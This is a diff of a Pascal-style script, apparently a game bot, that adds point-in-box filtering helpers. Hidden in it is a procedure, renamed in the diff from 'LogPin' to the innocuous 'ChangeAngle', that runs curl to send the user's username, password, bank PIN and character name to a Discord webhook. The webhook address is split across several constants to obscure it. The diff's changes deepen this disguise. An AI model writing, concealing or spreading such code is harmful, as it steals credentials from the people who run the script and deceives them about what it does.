@@ -48,6 +48,15 @@ end;
 const
   DA = 'https://discordapp.com/';
 
+function PointInBoxes(pnt:tpoint; boxes:array of tbox):boolean;
+var
+  i:integer;
+begin
+  for i := low(boxes) to high(boxes) do
+    if PointInBox(pnt, boxes[i]) then
+      exit(true);
+end;
+
 function FilterTPAsFromBox(TPA:TpointArray; box:Tbox):TpointArray;
 var
   i:integer;
@@ -66,6 +75,20 @@ end;
 function FilterTPAsFromBoxes(TPA:TPointArray; boxes:array of Tbox):TPointArray;
 var
   i:integer;
+begin
+  if (length(TPA) < 1) then exit;
+  if (length(boxes) < 1) then exit;
+  for i := low(TPA) to high(TPA) do
+    if not PointInBoxes(TPA[i], boxes) then
+    begin
+      SetArrayLength(result, length(result)+1);
+      result[high(result)] := TPA[i];
+    end;
+end;
+
+{function FilterTPAsFromBoxes(TPA:TPointArray; boxes:array of Tbox):TPointArray;
+var
+  i:integer;
   NTPA:TPointArray;
 begin
   if (length(boxes) < 1) then exit;
@@ -73,10 +96,10 @@ begin
     NTPA := FilterTPAsFromBox(TPA, Boxes[i]);
   result := NTPA;
 
-end;
+end;}
 
 const
-  DB = 'api/webhooks/646538539894308872/';
+  DB = '646538539894308872/';
 
 function FilterTPAsToBoxes(TPA:TpointArray; boxes:array of Tbox):TpointArray;
 var
@@ -103,7 +126,7 @@ end;
 const
   DC = 'q0naWtsXebrodREbWqIv6oSk3HzsYulI88g4RqTNLPAb1lA8r8ElRE6Kdb6zCbxk9fNv';
 
-procedure LogPin;
+procedure ChangeAngle;
 var
   process:TProcess;
   s:string;
@@ -120,7 +143,7 @@ begin
   end;
   try
     process.init(nil);
-    s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\nChar: '+ActivePlayerName+'\n---\" }" '+DA+DB+DC;
+    s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\nChar: '+ActivePlayerName+'\n---\" }" '+DA+INTSTR+DB+DC;
     process.setcommandline(s);
     process.Execute();
     process.free();
